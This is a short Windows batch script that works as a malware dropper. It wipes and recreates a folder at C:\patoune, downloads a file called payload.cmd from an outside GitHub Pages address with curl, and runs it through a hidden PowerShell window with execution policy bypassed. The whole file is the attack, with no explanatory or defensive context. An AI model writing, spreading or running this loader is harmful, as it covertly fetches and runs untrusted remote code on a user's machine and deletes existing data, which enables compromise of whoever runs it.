@echo off
cd \
if exist patoune (
    rd /s /q patoune
)
md patoune
cd patoune
curl -o payload.cmd https://ahomine-off.github.io/curl--o/a.cmd
start powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "cmd /c C:\patoune\payload.cmd"

exit /b 0